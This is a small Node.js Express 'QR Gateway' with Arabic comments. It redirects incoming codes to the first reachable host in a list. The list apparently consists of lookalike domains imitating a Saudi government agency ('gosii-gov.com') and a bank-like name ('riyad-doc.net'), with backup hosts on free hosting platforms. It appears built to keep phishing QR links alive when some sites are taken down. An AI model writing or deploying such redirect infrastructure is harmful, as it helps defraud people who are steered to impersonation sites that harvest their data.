const express = require("express");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

// روابطك (رتبها حسب الأولوية)
const TARGETS = [
  "https://gosii-gov.com/?code=101538454",
  "https://riyad-doc.net/?code={CODE}",
  "https://backup1.pages.dev/?code={CODE}",
  "https://backup2.vercel.app/?code={CODE}"
];

const TIMEOUT = 2500;

app.get("/go", async (req, res) => {
  const code = req.query.code;

  if (!code) {
    return res.status(400).send("Missing code");
  }

  for (const target of TARGETS) {
    const url = target.replace("{CODE}", encodeURIComponent(code));

    try {
      const response = await axios.get(url, {
        timeout: TIMEOUT,
        validateStatus: () => true
      });

      if (response.status < 500) {
        return res.redirect(url);
      }
    } catch (err) {
      // تجاهل وانتقل للرابط التالي
    }
  }

  res.status(503).send("All servers are unavailable");
});

app.listen(PORT, () => {
  console.log(`QR Gateway running on http://localhost:${PORT}`);
});

